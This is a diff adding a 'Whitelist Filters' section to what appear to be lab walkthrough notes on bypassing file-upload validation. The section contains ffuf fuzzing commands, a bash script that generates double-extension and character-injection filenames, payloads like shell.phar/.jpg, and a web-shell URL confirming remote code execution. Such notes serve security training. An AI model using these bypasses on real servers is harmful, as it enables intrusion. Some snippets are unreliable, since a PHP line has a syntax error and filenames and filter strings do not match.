@@ -13,6 +13,7 @@ This section documents common techniques for identifying and exploiting **file u
   - [Reverse Shells](#reverse-shells)
   - [Front-End Filters](#front-end-filters)
   - [Blacklist Filters](#blacklist-filters)
+  - [Whitelist Filters](#whitelist-filters)
 
 ---
 
@@ -374,5 +375,167 @@ http://94.237.51.160:49130/profile_images/shell.phar?cmd=id
 ![Filtered output](images/phar-rce.PNG)
 
 This confirms that the blacklist filter can be bypassed by identifying an alternative executable extension supported by the server.
+
+---
+
+## Whitelist Filters
+
+Whitelist-based validation is generally more secure than blacklist filtering. With a whitelist, **only explicitly permitted file extensions are allowed**, and all others are rejected by default. This significantly reduces the attack surface, as uncommon or obscure executable extensions are excluded unless intentionally permitted.
+
+Whitelist filters are typically used when an application only needs to support a small, well-defined set of file types (e.g., **image uploads**), whereas blacklist filters are more common in applications that must allow a wide range of files (e.g., **file managers**).
+
+When attempting to upload uncommon PHP-related extensions such as `.phar` or `.phtml`, the application rejects the upload with the following message:
+
+```
+Only images are allowed
+```
+
+![Filtered output](images/whitelist-filter4.PNG)
+
+Error messages can be misleading, so rather than assuming the filter type, we fuzz for allowed extensions using the error message as a response filter:
+
+```bash
+ffuf -w web-extensions.txt:FUZZ -request req.txt -request-proto http -fr "Only images are allowed"
+```
+
+The results indicate that only `.php*` extensions pass this check.
+
+![Filtered output](images/whitelist-filter5.PNG)
+
+However, when attempting to upload files using any of the allowed `.php*` extensions, the server responds with a different error message:
+
+```
+Extension not allowed
+```
+
+![Filtered output](images/whitelist-filter6.PNG)
+
+This behavior suggests that multiple validation layers are in place:
+
+- A whitelist filter that permits certain patterns (`Only images are allowed`)
+- A blacklist filter that explicitly blocks dangerous extensions (`Extension not allowed`)
+
+A common mistake in whitelist filtering is improper use of regular expressions. Consider the following PHP example:
+
+```php
+$fileName = basename($_FILES["uploadFile"]["name"]);
+
+if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
+    echo "Only images are allowed";
+    die();
+}
+```
+
+This filter only checks whether the filename contains a whitelisted extension—not whether it **ends** with one. As a result, it may be bypassed using **double extensions**, such as:
+
+
+```
+shell.php.jpg
+
+shell.jpg.php
+```
+
+In our case, however, these payloads still trigger the `Extension not allowed error`:
+
+```
+filename=shell.php.jpg
+
+filename=shell.jpg.php
+```
+
+![Filtered output](images/whitelist-filter7.PNG)
+
+This indicates the use of a **strict regular expression**, likely similar to the following:
+
+```php
+$fileName = basename($_FILES["uploadFile"]["name"]);
+
+if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)), $fileName)) {
+    echo "Only images are allowed";
+    die();
+}
+```
+
+Here, the `$` anchor ensures that only filenames ending in a valid image extension are accepted, making the filter significantly more robust.
+
+Even strict whitelists can sometimes be bypassed on **outdated or misconfigured systems**, particularly through **character injection**. Certain special characters may cause discrepancies between how the application validates filenames and how the underlying file system interprets them.
+
+Common injection characters include:
+
+- `%20`
+- `%0a`
+- `%00`
+- `%0d0a`
+- `/`
+- `.\`
+- `.`
+- `'''`
+- `:`
+
+The null-byte character (`%00`) works with PHP versions `5.X` or earlier. It causes the server to ignore anything after the null-byte, making it useful for double extension bypasses:
+
+- shell.php%00.jpg &rarr; shell.php
+
+The colon (`:`) accomplishes the same thing on Windows servers:
+
+- shell.aspx:.jpg &rarr; shell.aspx
+
+To systematically identify bypasses, we generate filename permutations combining:
+
+- Double extensions
+- PHP-related extensions
+- Special characters
+
+The following wordlist contains many double extensions, including some with special characters:
+
+- /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt
+
+Another option is to write a bash script that generates all different permutations. The following script generates a comprehensive wordlist:
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps' '.phar' '.phtml'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
+
+We then fuzz against the blacklist filter:
+
+```bash
+ffuf -w wordlist.txt:FUZZ -request req.txt -request-proto http -fr "Extension not allowed"
+```
+
+The results are refined and passed into a second scan targeting the whitelist filter:
+
+```bash
+cut -d " " -f 1 first-filter.txt > filter1.txt
+```
+
+```bash
+ffuf -w filter1.txt:FUZZ -request req.txt -request-proto http -fr "Only images allowed"
+```
+
+This process yields multiple candidates that bypass both filters.
+
+One successful payload is:
+
+```
+filename="shell.phar/.jpg"
+```
+
+![Filtered output](images/whitelist-filter9.PNG)
+
+
+Visiting the uploaded file confirms remote code execution:
+
+```
+http://94.237.120.119:48470/profile_images/shell.phar.jpg?cmd=id
+```
+
+![Filtered output](images/whitelist-filter1+.PNG)
 
 ---
